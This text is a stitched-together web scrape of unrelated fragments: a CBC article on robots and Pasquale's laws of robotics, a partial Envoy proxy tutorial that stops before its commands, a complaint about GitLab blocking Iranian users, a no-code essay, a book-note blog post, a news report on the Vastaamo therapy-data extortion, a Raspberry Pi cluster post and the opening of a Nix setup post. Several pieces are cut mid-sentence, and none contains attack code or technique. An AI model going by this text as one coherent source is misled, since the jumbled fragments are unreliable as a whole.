society, a play on sci-fi author Isaac Asimov's laws of robotics introduced in the 1942 short story <em>Runaround</em>.</p>  <p>Pasquale's new laws are:</p>  <ul>   <li> <p>Employ robotics and A.I. in ways that complement professionals, instead of replacing them.</p> </li>   <li> <p>Prevent robots from mimicking human qualities like empathy or emotion</p> </li>   <li> <p>Avoid "arms races" between robotics researchers.</p> </li>   <li> <p>Keep record of who designed or controls a robot, in order to know who to contact — or hold responsible — in case something goes wrong.</p> </li>  </ul>  <h2><strong>Robotic tools, or companions?</strong></h2>  <p>As the pandemic thrusts robots and automation further into the mainstream spotlight, some people may find them unusual, or even unnerving.</p>  <p>Carpenter explained that many people's expectations of robots are based in science fiction. And in the West, at least, those depictions are often threatening. For every R2-D2 in Star Wars, she says, you'll find a seething Terminator — or the murderous robot dog in Black Mirror.</p>  <p>"It's a combination of fascination at the technology, but also a little bit of fear [and] trepidation because they don't understand its capabilities and its limitations," said Carpenter.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5774965.1603481737!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/julie-carpenter-book.jpg 300w,https://i.cbc.ca/1.5774965.1603481737!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/julie-carpenter-book.jpg 460w,https://i.cbc.ca/1.5774965.1603481737!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/julie-carpenter-book.jpg 620w,https://i.cbc.ca/1.5774965.1603481737!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/julie-carpenter-book.jpg 780w,https://i.cbc.ca/1.5774965.1603481737!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/julie-carpenter-book.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5774965.1603481737!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/julie-carpenter-book.jpg"></p></div><figcaption>Julie Carpenter says her research of Explosive Ordnance Disposal (EOD) personnel and their interactions with robots has implications for many fields.<!-- --> <!-- -->(Submitted by Julie Carpenter/Routledge/CBC composite)</figcaption></figure></span></p>  <p>If you're introducing robots into the workplace, she said, talk to your colleagues about what they're being used for, and how they might affect everyone's work.</p>  <p>"Have discussions with your staff. Say, this is what we're thinking about. These are the robots we're looking at. This is how your job might change,"&nbsp;she said.</p>  <p>Sometimes, Carpenter added, people might be more willing to embrace robots in the workplace if they take on a familiar form — like how the four-legged Spot resembles a dog.</p>  <p>But she noted that people can develop an attachment to robots simply because of the roles they play, even without anthropomorphizing them.</p>  <p>Carpenter studied how the U.S. military uses robots for tasks like bomb disposal for her book <em>Culture and Human-Robot Interaction in Militarized Spaces.</em></p>  <p>She found that many U.S. military forces use robots for sensitive or dangerous tasks, such as explosive disposal. Even though they looked more like miniature tanks, some soldiers would give them names, or consider them a mascot for their unit.</p>  <p>"I want to emphasize, though, they would never regard it the same as a human teammate, at this point,"&nbsp;she said.</p>  <p>"But you can see … that we're navigating and negotiating where robots fit into our lives, even socially."</p></span></p></div></div>]]>

    <p>Overview</p>
    <div id="para-div">
      <p><span>Envoy</span> is an open source service proxy and a communication bus designed for large modern API
        driven microservices architecture. It is a Layer3/Layer4 (TCP/UDP) network proxy with additional support for Layer7 (HTTP).</p>
      <p>Before describing the architecture components of <span>Envoy</span>, we define the following two terms:</p>
      <ul id="blue-sqr-ul">
        <li>
          <p><span>Downstream</span> :: a client entity connecting to Envoy to send requests and receives responses</p>
        </li>
        <li>
          <p><span>Upstream</span> :: a service entity that Envoy connects to for forwarding requests and for getting
            responses from</p>
        </li>
      </ul>
    </div>
    <p>The following diagram illustrates the high-level architecture of <span>Envoy</span>:</p>
    <div id="img-outer-div"> <p><img src="https://www.polarsparc.com/xhtml/images/envoy-2.png" alt="Envoy Architecture"></p><p>Figure-1</p>
    </div>
    <br>
    <div id="para-div">
      <p>The following are the core components of <span>Envoy</span>:</p>
      <ul id="blue-sqr-ul">
        <li>
          <p><span>Listener</span> :: module responsible for binding to an IP address/port and accept connections
            from <span>Downstream</span> nodes</p>
        </li>
        <li>
          <p><span>Cluster</span> :: module responsible for connecting to a group of <span>Upstream
            </span> nodes and forwarding requests using an associated load-balancing policy</p>
        </li>
        <li>
          <p><span>Load Balancer</span> :: module responsible for distributing traffic between the different
            <span>Upstream</span> nodes within a <span>Cluster</span> in order to effectively use the
            available resources</p>
        </li>
        <li>
          <p><span>Network Filter</span> :: module that handles incoming requests on a <span>Listener
            </span> and maps them to the appropriate <span>Cluster</span>(s)</p>
        </li>
        <li>
          <p><span>Filter Chain</span> :: a series of <span>Network Filter</span>(s) that form a
            request processing pipeline</p>
        </li>
        <li>
          <p><span>Worker Thread</span> :: architecture uses a single process with multiple threads. Once a
            <span>Downstream</span> connection is accepted by a <span>Listener</span>, the connection
            spends the rest of its lifetime bound to a single worker thread</p>
        </li>
        <li>
          <p><span>HTTP Router Filter</span> :: implements HTTP forwarding by reverse proxying requests from the
            <span>Downstream</span> to the appropriate <span>Cluster</span> based on route configuration</p>
        </li>
      </ul>
    </div>
    <p>Installation and System Setup</p>
    
    <p>The following picture illustrates the 5-node <span>ODroid-N2</span> cluster in operation:</p>
    <div id="img-outer-div"> <p><img src="https://www.polarsparc.com/xhtml/images/envoy-3.png" alt="N2 Cluster"></p><p>Figure-2</p>
    </div>
    
    <p>For this tutorial, let us assume the 5-nodes in the cluster to have the following host names and ip addresses:</p>
    <table id="col2-table">
      <thead>
        <tr>
          <th>Host name</th>
          <th>IP Address</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>my-n2-1</td>
          <td>192.168.1.41</td>
        </tr>
        <tr>
          <td>my-n2-2</td>
          <td>192.168.1.42</td>
        </tr>
        <tr>
          <td>my-n2-3</td>
          <td>192.168.1.43</td>
        </tr>
        <tr>
          <td>my-n2-4</td>
          <td>192.168.1.44</td>
        </tr>
        <tr>
          <td>my-n2-5</td>
          <td>192.168.1.45</td>
        </tr>
      </tbody>
    </table>
    <p>Open a Terminal window and open a tab for each of the 5 nodes <span>my-n2-1</span> thru <span>
        my-n2-5</span>. In each of the Terminal tabs, <span>ssh</span> into the corresponding node.</p>
    <p>To setup the package repository for <span>Docker</span> on the node <span>my-n2-1</span>, execute
        the following commands:</p>
    <div id="cmd-div">

        <p><span dir="auto" itemprop="articleBody"><p>On 3rd Oct. 2020 GitLab blocked Iranians’ access (based on IP) without any prior notice! and five days later (8th Oct.) my friend’s account blocked and still he doesn’t have any access to his projects! even after creating a ticket and asks for a temporary access to only export his projects! <strong>GitLab refused to unblock him!</strong> (screenshot in appendix). My friend is not the only one who blocked by GitLab, with a simple search on the web you can find a growing list of blocked accounts.  <br>
So I decided to move from GtiLab and EVERY Free Software based/hosted/managed on/in USA.</p>

<p>GitLab is not the only actor in this discrimination against Persian/Iranian people, we also blocked by GitHub, Docker, NPM, Google Developer, Android, AWS, Go, Kubernetes and etc.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2><strong>Introduction</strong></h2><p>I have been building web apps and native apps on two of the leading no-code tools out there for the last year. When I started, I was blown away. I could get so much done in so little time.</p><p>Being a developer, this was liberating. I had always felt that a lot of the things we developers do aren’t actually that complicated. Unfamiliar syntax and complex developer processes keep people out. 99% of the time, developers are just wiring things. So initially, it made sense. While other developers scoffed at these tools, I was churning out apps after apps in a few weeks time.</p><p>As months rolled by, my budding romance with no-code tools ebbed. I struggled to justify why we were building things using them. I was interested in this space so I did my research. I read the no-code manifesto from various sources, tried out a bunch of other tools and began putting my thoughts together. </p><p>This essay is the result of that research. Please note, when I say no-code in this article, I mean no-code app builders / website builders. I don’t have any experience with the other types of no-code tools (such as automations, integrations etc) so I won’t comment about them.</p><h2>Why no-code</h2><p>Let’s take a logistics example. In logistics, there are standardised solutions for the highways, railroads and seas. That transportation is relatively cheap because you can move a lot of things together and economies of scale kick in. </p><p>Getting things from the highways into individual homes, however, is difficult and expensive because you need one transportation medium for each consumer. This is also called as the last-mile problem.</p><p>Coming back to software, we now have standardised solutions for the “highway” problems. We have solutions for email, video conferencing, searching, entertainment and so on. These problems are faced by a large number of people and so it makes economic sense for businesses to go solve them.</p><p>Then, we have the small problems. For example, an app that one business in the world needs to solve an operational challenge. This use-case is so specialised that businesses just don’t have an incentive to solve it. Without no-code, this business will have to get this software custom built which will take a lot of time and money. This is where no-code shines. It provides simple building blocks that users can use to put together a custom solution. Goes without saying, no-code tools are only as good as their primitives - these fundamental building blocks that they allow mixing and matching.</p><blockquote><p>With no-code, you can build custom things for yourself that you can’t find an out-of-the-box solution for.</p></blockquote><h2>Landscape today</h2><p>A lot of the last-mile problems in software yesterday are now becoming railroad problems. In fact, we are finding more efficient solutions for many of the railroad problems as well. </p><p>Take Shopify for example. Does it make sense for anyone to build an e-commerce store from scratch today? Shopify provides so many features for such a low starting price that it’s just impossible for anyone building it from scratch to match it.</p><p>Until a few years ago, if you were a SAAS and you needed a decent software for organising your guides, API reference and solutions, your options were Intercom, Freshdesk and Zendesk. All of them are full-blown support platforms which you might or might not need. Today, you can create a public Notion document with all your support articles and you’re done. For free. Notion provides search out-of-the-box, supports all sorts of media types and looks great. There are a dozen other things you can do in Notion for which you previously would have paid to several different vendors.</p><p>Airtable has done something similar to operations on entities. If you want to create a form on top of an Airtable base, you can do that at the click of a button within Airtable. In fact, you can assemble entire apps within Airtable.</p><p>In the near future, we will see solutions that will introduce even better abstractions and upgrade last-mile solutions into railroads solutions and railroads solutions into their more efficient variants.</p><h2>What’s my problem</h2><p>My fundamental problem is that most no-code tools out there say that their users will not need code at all. No, I am not referring to the term “no-code”. Many in the no-code community agree that that name is a misnomer. I am referring to what these tools say on Twitter, or write on their landing pages. They say you can build <em>anything </em>without any code at all. That I think is either a <em>blatant lie </em>or a delusion.</p><p>With no-code tools, you are simply putting blocks together. If you need a different block or if you are looking for smaller blocks than the ones that the tool provides, you are stuck. </p><blockquote><p>The truth is - code is king. When you want custom flows, code will come to rescue. When you need a component that doesn’t exist, code will come to rescue. When you want to connect anything that the creators of the no-code tool didn’t envision getting connected, code will be the answer.</p></blockquote><p>Don’t confuse my argument with another argument that people throw at no-code tools - “You are using code underneath. You need developers for that code. What no-code?” </p><p>I think there is definitely value in creating a layer on top of code. My big problem is - today’s no-code tools don’t seem to admit that their primitives are not good enough. </p><p><strong>That they still don’t have a primitive that comes close to code.</strong></p><p>With the primitives that no-code has today, there is no competitive edge. Anyone can build a bunch of components, write some integrations and ship a new no-code tool. Please don’t say these products have communities. When a user is stuck, they are looking for answers and no amount of community support can unblock them.</p><p>Worse still, SAAS software such as Notion and Airtable can eventually provide most of the functionalities that no-code tools provide, out-of-the-box. They have access to the same primitives. It’s already happening. There are SAAS today that are providing white-label apps to restaurants, convenience stores, e-commerce stores etc. </p><p>Let’s say there is an app that people use a no-code tool today to build. If there are sufficient number of users that need this app, eventually, there will come a SAAS that will generalise what users need and offer a standard solution. Since they will dive deep into that specific problem, they will be able to put together features that no-code app builders would take a long time to build. Some might not even be possible.</p><p>I know some will go - “What is he even talking about? I have built so-and-so complicated software with x no-code tool”. Let me take a very specific example and show you what I mean. I have personally struggled with this one, so I know what I am talking about.</p><h2>An example</h2><p>Let’s say you have an app with a list of convenience stores. Whenever a user opens your app, you want to sort the list of stores in the increasing order of distance from the user’s current location. That’s it, no big deal. </p><p>You have a Google sheet with data that looks as below:</p><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fef5da496-a5df-467b-be5a-cd9b312e4a5d_624x89.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fef5da496-a5df-467b-be5a-cd9b312e4a5d_624x89.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/ef5da496-a5df-467b-be5a-cd9b312e4a5d_624x89.png&quot;,&quot;height&quot;:89,&quot;width&quot;:624,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:38478,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></p><p>The latitude and longitude for each store are in the Google maps link. Logically, what you need to do is the following - </p><ol><li><p>Extract the latitude longitude from each link.</p></li><li><p>Get user’s current location</p></li><li><p>Find distance between each store and user location. You can probably use Haversine formula here which should give good enough results.</p></li><li><p>Sort the list in the increasing order of distance found in step 3</p></li></ol><p>How do you accomplish this with a no-code tool? Let’s look at our options. </p><ol><li><p>Use an API? Okay, how do we write APIs? Code. Let’s say there is a tool to build APIs without code. How will you write the core sorting logic? Well, code.</p></li><li><p>Use Apps Script to sort the locations with respect to distance? What is Apps Script? Code.</p></li><li><p>Some no-code tools slip a coding paradigm of their own and call themselves no-code. That’s still code with the same problems and the same challenges as the other programming languages. So, code.</p></li></ol><p>Your only hope is if the tool provides this capability out-of-the-box. Even then, you will need to do some work to give it the data in just the right format that it needs.</p><p>Consider even a small modification to this problem. Let’s say you had to sort the list above with respect to a given fixed location that is available while the app is running, not the user’s location. This small tweak too can wreak havoc to a no-code solution. If the no-code tool expects you to specify the list to sort and the location to sort it by, you will be left wondering how to tell the tool to take user’s current location. If the tool takes user’s current location by default, you will be left wondering how to pass it your custom location.</p><p>This is a very small example. In a business that gets any kind of traction, eventually, flows get complex, validations get tricky and integrations get specific. You will see variants of the problem above, over and over again in different flavours. Sometimes, you will need to nudge people down paths that the tool doesn’t support, you will need to collect some data about the user experience that the tool doesn’t give you any visibility into and you will need to introduce business logic that the tool just wouldn’t give you any way to realise. These problems will just push the complexity on some other part of your application.</p><p> I have built full-fledged production apps on some of these tools and it makes me cry just to think about how much we had to change things on our side to play nice with the tool. The rigidity of the tool transferred all the responsibility on us to find a way to make a feature work on it. </p><p>I will talk more about very specific problems about the challenges I faced in future blog posts. So, if you are interested in this space, why don’t you subscribe to my newsletter? </p><p>I worry about all the people who are using no-code tools today to build businesses that one day will get big and as a result, complex. What will their developers do?</p><p>Again, don’t mistake my criticism for a lack of respect for the no-code movement. I think the tenets of the movements make …</p></div></div>

<p><em>I’m no Ernest Hemingway. Nor I’m a best-selling author. But, I know a thing or two about distilling the key ideas from wrapped pieces of paper – also called books. Up to this point, I have over <a href="https://durmonski.com/category/book-summaries/" target="_blank" aria-label="100 summaries (opens in a new tab)" rel="noreferrer noopener">100 summaries</a> of famous titles published on my site. It took me a little over 2 years to categorize them. And, if I can name the main thing that I’ve been asked through these years from readers, it will have to be this, “What’s your approach when summarizing books?”</em></p>



<p>People who ask me this question – I think – expect that I use some elaborate system of AI-powered algorithm that tracks the movement of my eyes and send the sections I’ve been staring at the longest to a vault with notes. And, probably, they imagine that I have piles of wooden boxes filled with index cards that are carefully arranged and adequately numbered. Others, perhaps, imagine that I’m working directly with the CEO of a modern note-taking app and I have access to a not-yet-released version that reads our thoughts and transcribes what’s inside our heads in fancy online sheets.</p>



<p>It’s far simpler than that. Actually, the process I use is so simple and unfancy that I sometimes think that I should re-evaluate it and add more steps to make it “look” and “sound” more interesting to others.<span id="easy-footnote-1-11947"></span><span><a href="#easy-footnote-bottom-1-11947" title="Of course, I won&amp;#8217;t do that."><sup>1</sup></a></span></p>



<p>And while I’ve made some improvements in terms of how I take notes from the books I read, the process is still rather simple.</p>



<p>In this piece, I’ll do my best to describe my book summarizing process so you can start your own project or simply take better notes when reading.</p>



<p>First, let’s start with, why take notes…</p>







<h2><strong>Why It’s Important to Take Notes</strong>?</h2>



<p>For me, obviously, note-taking is an important step of my book-summarizing process. After all, the only way I can summarize the books I read is through my notes. However, I started taking notes from books long before this site was born.</p>



<p>Here’s why…</p>



<p>At some point, in my early 20s, I realized that the content I read was quickly forgotten. The things I found interesting in a book sat right where I left them – in the book itself.</p>



<p>And, what’s the point of reading <a href="https://durmonski.com/category/book-summaries/business-books/" target="_blank" aria-label="business books (opens in a new tab)" rel="noreferrer noopener">business books</a>, for example, if you can’t recall the insights of the author when you’re in a similar situation, right?</p>



<p>When I realized how I’m wasting my time and not taking full advantage of the contents, naturally, I started doing the simplest thing I could: writing down the most intriguing passages in a little notebook. This was before the mass adoption of smartphones – the pre-iPhone era. My phone back then was with a keypad layout.<span id="easy-footnote-2-11947"></span><span><a href="#easy-footnote-bottom-2-11947" title="Yes, imagine a Nokia 3310 type of phone. It&amp;#8217;s quite hard to take notes when you have to press 5 three times to get to the letter L."><sup>2</sup></a></span> And, the famous note-taking apps that we all use today were not even considered for creation.</p>



<p>The results of this simple habit were striking!</p>



<p>Taking notes with a pen and paper fortified the knowledge I gained from the books. I was able to reflect on the text and later go through my commentary again which, as a result, allowed me to remember the key ideas from the author for a longer period. Additionally, this allowed me to actually use the techniques mentioned in the books I read.</p>



<p>My conclusion was, and still is, that solely reading rarely helps. To understand what the author wanted to say, it’s essential to re-read, re-think, and re-write what is mentioned inside a book.</p>



<p>Or to put it differently, if you’re not distilling the main ideas from the books you read, most of the learned material will soon become obsolete in your brain. This, of course, is if your reading goals involve taking some sort of action based on the text. If you’re just reading for entertainment, then, obviously, taking notes is not really needed. </p>



<p>But the process of note-taking can be used in many other ways. We’re constantly consuming content in one form or another. If you regularly take note of the most important things from the articles, podcasts, or videos you consume, you’ll create a vast library of insights that can surely come in handy in your near future.</p>



<p>For now, though, let’s focus on reading books. And with this in mind, let me tell you how I approach reading:</p>







<h2>How I Read Books?</h2>



<p>I’m a huge book fan. I adore spending time in libraries. It’s amazing that in just one shelf in a library, there can be millions of pages full of wisdom. I can spend hours flipping big volumes and reading random passages from them.</p>



<p>Yet, collecting physical books started to become a burden for me at some point. The physical space in my modest apartment dedicated to books was quickly filled. But that was just part of the problem. Paying for shipping was starting to hurt my budget.<span id="easy-footnote-3-11947"></span><span><a href="#easy-footnote-bottom-3-11947" title="The average delivery price when using Amazon to Bulgaria is around 8 USD."><sup>3</sup></a></span> The solution was simple – ebooks.</p>



<p>But there was something else that made me switch from physical to ebooks – the workflow. Taking notes while you read an actual, physical book requires you to carry the book with you everywhere. Also, to take notes, you have to hold the book while you write the part you want to copy and make sure you don’t forget where you left. I mean, I’m sure you can relate if you ever had to take notes from a 700+ pages book while trying to pose for Instagram on your vintage sofa. It’s hard to balance your phone and the book.</p>



<p>That’s why, in 2019, I decided to switch to ebooks for good.<span id="easy-footnote-4-11947"></span><span><a href="#easy-footnote-bottom-4-11947" title="Not that I pose for Instagram while I read, but mainly because copying text from an ebook is super simple."><sup>4</sup></a></span></p>



<p>Not only I was reading more because my phone is with me all the time, but I was also taking faster notes.</p>



<p>Of course, for some people, reading on your phone seems impossible. After all, our smartphones are famous for being distraction machines that are capable of degenerating and destroying even the best intentions. A simple beep can suck you into an hour-long online browsing experience that ends up with the purchase of “essential” items for your apartment. </p>



<p>The way I solved this problem is rather popular: I simply stopped all forms of notifications. All the buzzing sounds. Uninstalled and blocked social media accounts and similar crippling software that’s not really adding real value to my physical existence.</p>



<p>I know, for most people, this is unthinkable. Removing your social media account (+ the notifications) is like cutting your left arm and throwing it to a mob of lunatic dogs.</p>



<p>Yet, that’s the main reason a lot of folks are unable to meet their reading goals (or goals in general). But that’s a topic I’ll probably discuss some other time.</p>



<p>Let’s move on…</p>







<h2>How I Actually Take Notes?</h2>



<p>I use Google Keep.</p>



<p>Yes, as mentioned, my process is quite simple.</p>



<p>I’m sure, I know actually, that there are other tools available. I’ve tested some of them. But tools are only as good as your ability to work with them.</p>



<p>A lot of people are so preoccupied with using the most modern tool that they spend weeks reading tutorials, buying courses even, on how to actually work with this software that they end-up forgetting why they started in the first place.</p>



<p>Google Keep works for me because it’s super simple. The lack of extra sexy functionalities, for me, is the best functionality.</p>



<p>When you have fewer options you focus on doing the actual task, not preoccupying your mind with configuration and settings.</p>



<p>Here’s how my Google Keep account is organized:</p>



<p>I have labels for different things I’m taking notes on. Obviously, book summaries is one of the things I note down. Inside this label, each additional box represents a particular book. However, since there is a character limit for a single note on Google Keep, I sometimes split the note into two or more – depending on my notes.<span id="easy-footnote-5-11947"></span><span><a href="#easy-footnote-bottom-5-11947" title="The character limit on Google Keep per note is 20,000. This is around 3,500 words. However, keep in mind that the limit also includes spaces. Meaning that each space eats up from your characters."><sup>5</sup></a></span></p>



<p>Here’s how I’ve organized my labels:</p>



<div><figure><img src="https://durmonski.com/wp-content/uploads/2020/10/google-keep-my-labels.jpg" alt="" width="288" height="600" srcset="https://durmonski.com/wp-content/uploads/2020/10/google-keep-my-labels.jpg 384w, https://durmonski.com/wp-content/uploads/2020/10/google-keep-my-labels-144x300.jpg 144w, https://durmonski.com/wp-content/uploads/2020/10/google-keep-my-labels-274x571.jpg 274w" sizes="(max-width: 288px) 100vw, 288px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20288%20600'%3E%3C/svg%3E" data-lazy-srcset="https://durmonski.com/wp-content/uploads/2020/10/google-keep-my-labels.jpg 384w, https://durmonski.com/wp-content/uploads/2020/10/google-keep-my-labels-144x300.jpg 144w, https://durmonski.com/wp-content/uploads/2020/10/google-keep-my-labels-274x571.jpg 274w" data-lazy-src="https://durmonski.com/wp-content/uploads/2020/10/google-keep-my-labels.jpg"></figure></div>



<p>And, if I can give you a step-by-step process on how I summarize books it should look like this:</p>



<ol><li><strong>Questions</strong>: Before I start reading, I write down a few questions that I will look for answers to in the book. For example, let’s take a look at the book <a aria-label="Thinking in Bets (opens in a new tab)" href="https://durmonski.com/book-summaries/thinking-in-bets/" target="_blank" rel="noreferrer noopener">Thinking in Bets</a>. An obvious first question that I’ll look to answer is, “What is thinking in bets?” Then, probably this one, “Why thinking in bets is important and how I can think in bets?”<span id="easy-footnote-6-11947"></span><span><a href="#easy-footnote-bottom-6-11947" title="I suggesting reading the following book about getting better at reading: <a aria-label=&quot;How to Read a Book (opens in a new tab)&quot; href=&quot;https://durmonski.com/book-summaries/how-to-read-a-book/&quot; target=&quot;_blank&quot; rel=&quot;noreferrer noopener&quot; class=&quot;ek-link&quot;>How to Read a Book</a>."><sup>6</sup></a></span></li><li><strong>The purpose of the book</strong>: What’s the main purpose of the book? What’s the goal of the author? These are usually answered in the opening chapter of any book. Answering these questions helps me later formulate the following two sections in my book summaries: The Book In Three Or More Sentences and The Core Idea.</li><li><strong>Outline themes</strong>: Ideas in books are usually spread out. On page 20 you can spot a great idea about X. Then, 100 pages later, you can find additional information about this same idea, X. That’s why, when I take notes in my app, I try to highlight themes, I don’t simply summarize sections. For example, I’ll write: “Theme 02: We have a tendency to equate the quality of a decision with the quality of its outcome.” Then, I copy and paste sections from the book that reinforce this specific idea. As mentioned, the sections can be from different parts of the book. </li><li><strong>Outline actionable steps</strong>: Nonfiction books are full of actionable steps that you can practice – that’s why I love them. How to spot such practical lessons? Think about the following, “Is this applicable in the life of the average person?” Again, if we look at the book Thinking in Bets, there is a tool called 10-10-10. It’s about asking yourself the following set of questions: “[W]hat are the consequences of each of my options in ten minutes? In ten months? In ten years?” Everybody can benefit from this. You simply ask yourself a set of questions in a situation.</li></ol>



<p>Here are a couple of additional things I do when I take notes:</p>



<ul><li>I use the following phrase to highlight quotes from the text: “Quotes:”</li><li>I use the following to distinguish my thoughts from the words in the actual book: “Me:” Basically, what comes after “Me:” is mine annotation of the text. This later helps me when I write the summary.</li><li>As mentioned, I use “Theme #” and after that, I add text from the book that’s related to the particular topic. I use bullets to separate different sections from the book.</li><li>I use an additional note that I label “The Name of the Book #2” when I’ve reached the limit of the …</li></ul></div></div></div>

                    <p>The Finns were stunned this Friday at the outcome of a scandal caused by the <strong>extortion of a group of hackers</strong> to&nbsp;a private company that provides services as a psychotherapy center for the public health system.</p>

<p>In a country that claims to be at the forefront of digitization and data security, the criminals managed to access the database of thousands of customers of <strong>the company Vastaamo</strong> after detecting vulnerabilities in their system.</p>

<p>According to its website, Vastaamo offers psychological and psychiatric treatment to patients who suffer from disorders such as <strong>depression and anxiety</strong>.&nbsp;Many of the clients come from public services paid by the Finnish&nbsp;<strong>Social Security (Kela)</strong>.</p>

<p>Extortionists demanded around<strong> 450,000 euros (in bitcoins)</strong> in exchange for not publishing the clinical and mental health data of thousands of people.</p>

<p>The criminals started to publish <strong>the data of 100 people every day in the encrypted web Tor&nbsp;</strong>two days ago. They claimed they would not stop until&nbsp;they received the money.&nbsp;As the company was&nbsp;resisting to attend the demands of the hackers, personal data of over 200&nbsp;people - including minors - have been released online.</p>

<p>The information published could not be more sensitive: it included&nbsp;the patient's name, personal identification number, telephone number, email address and residence address, together <strong>with the content of the therapy sessions</strong>.</p>

<p>"An unknown hostile party has been in contact with Vastaamo and claims to have obtained confidential information from the company's customers.&nbsp;The Central Criminal Police launched a criminal investigation into the matter.&nbsp;Immediate notifications were also made to the Finnish Cyber ​​Security Center, Valvira and the Data Protection Commissioner.&nbsp;In addition, Vastamo took immediate steps to clarify the matter in cooperation with external and independent security experts," the company said in a press release.</p>

<h2>Rumours of ransom payment</h2>

<p>The data of <strong>another 100 people were published on Thursday </strong>night. But on Friday morning the page where the data was being released had been deleted, which triggered rumors about a possible payment to the extortionists.</p>

<p>At the time of writing this article, the company had&nbsp;neither confirmed nor denied the payment.&nbsp;<strong>Tuomas Kahri</strong>, Chairman of the Board of Vastaamo, told to the newspaper Ilta Sanomat that <strong>he would not comment on the ransom payment </strong>allegations.</p>

<p>The identity or nationality of the extortionists is unknown, and they appeared to not be worried about their possible arrest by the authorities.</p>

<p><strong>Ilta Sanomat </strong>exchanged several messages with them on Thursday, and according to the tabloid the criminals said they did not know that there was data of minors among the published information. However, they ensured that this would not stop their actions.</p>

<p>According to the same newspaper, the blackmailer had&nbsp;also offered individual patients the possibility of deleting their own data by <strong>paying about 540 euros in bitcoins</strong>.</p>

<h2>Police investigation</h2>

<p><strong>The National Bureau of Investigation (KRP)</strong> is investigating the attack as a case of gross breach and dissemination of private information. Police are asking people who have noticed their private information being disseminated to file an electronic crime report.</p>

<p>The company has been criticized for failing to notify customers earlier that their data was exposed in this extortion case. Some have complained they were contacted only after the case became known to the general public.</p>

                <section id="post-body">
                    <p>I’ve recently been getting more interested in distributed systems, and I wanted to get experience building some of the concepts I’ve read about.</p>
<p>My interest lies more on the software and system design side – more “how would we design and build an example of a distributed file system across four computers?” than “how do I make a reliable home server to play media?” – which is why my focus is on playing around with some toy software problems instead of worrying about what a real production hardware setup would look like. As with anything, it’s almost too easy to get caught up in the minor details instead of what you meant to work on, and I feel like I could spend days agonizing over hardware choices.</p>
<p>That being said, I did want to work with real hardware, which makes it more interesting than running VMs. There’s something about physically disconnecting ethernet switches to see the effect on the software that’s intriguing, and doubly so if the software can handle it gracefully.</p>
<p>I want to get a little more experience with the concepts behind some distributed systems papers and projects I’ve learned about. I’ve heard that the true devil of distributed systems lies in the details at scale, which isn’t really possible for my tiny cluster, but I’m planning to work through these projects to get a better feel for some of the general ideas. I’ve found that programming an implementation is one of the best ways to understand a concept, even if it’s a toy implementation, and I’m looking forward to doing so for some of the papers I’ve been reading.</p>
<p>I’m planning to write most of the software in Go because I’ve enjoyed working with its RPC library in the past and I want to get more experience working with the language. I do mostly C++/Java/JavaScript at work, and it’s always nice to explore outside of the comfort zone.</p>
<p>Anyways, back to the cluster; I ended up picking N=4 for my little cluster and drew up a quick diagram of what my plan:</p>
<p><img src="https://alexanderell.is/posts/pi-cluster/cluster-architecture.png" alt="Cluster Architecture diagram; 4 Raspberry Pis connected to a network switch"></p>
<center>
<em>The planned cluster, with 4 Raspberry Pis connected to power on the left and a network switch on the right</em>
</center>

<p>This ended up actually being pretty close to reality, which is always nice for design diagrams. I’ll spare you the order details (I’ve found these can quickly get out of date), but after the components trickled in, I wired up the Pis from 1-4 from bottom to top with a helpful case to keep them separate.</p>
<p><img src="https://alexanderell.is/posts/pi-cluster/cluster-picture.jpeg" alt="Photo of the 4 Raspberry Pis in action"></p>
<center>
<em>The cluster in action</em>
</center>

<p>So far I’ve done the following:</p>
<ul>
<li>Installed the Raspberry Pi OS Lite on each MicroSD &amp; enabled SSH</li>
<li>Grabbed the IPs and SSH’ed into each</li>
<li>Had to re-image a MicroSD after I didn’t save the password I generated</li>
<li>Did some basic ssh/scp/config setup to install .vimrc/tmux/vim/git/Go</li>
<li>Wrote up a basic heartbeat monitoring program to get them talking to each other</li>
<li>Spent 15 minutes debugging before I realized the switch was turned off</li>
</ul>

<p>My next steps are probably something like this, time and motivation permitting:</p>
<ul>
<li>Flesh out and write up the heartbeat monitoring program</li>
<li>Design and implement a basic distributed file system that I can reuse for future projects
<ul>
<li>Probably will follow along with GFS but with some appropriate adjustments</li>
</ul>
</li>
<li>Work through a few papers and adapt them to the mini-cluster
<ul>
<li>Tentatively thinking MapReduce, some KV store (implementing consistent hashing), Raft, etc.</li>
</ul>
</li>
</ul>
<p>Stay tuned for more :)</p>

October 25, 2020 | https://wickedchicken.github.io/post/macos-nix-setup/ | <a href="https://web.archive.org/web/*/https://wickedchicken.github.io/post/macos-nix-setup/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>I recently got a new Macbook, and began setting up the <a href="https://nixos.org/">Nix</a> package manager to
install my developer toolset. I mainly did this to try and have a working setup without
installing <a href="https://brew.sh/">Homebrew</a>. Since I ran into a few issues, I wanted to briefly
document what I did and why in case others wanted to try the same.</p>
<h3 id="why-nix-and-why-not-homebrew-or-macports">Why Nix? (and why not Homebrew or MacPorts?)</h3>
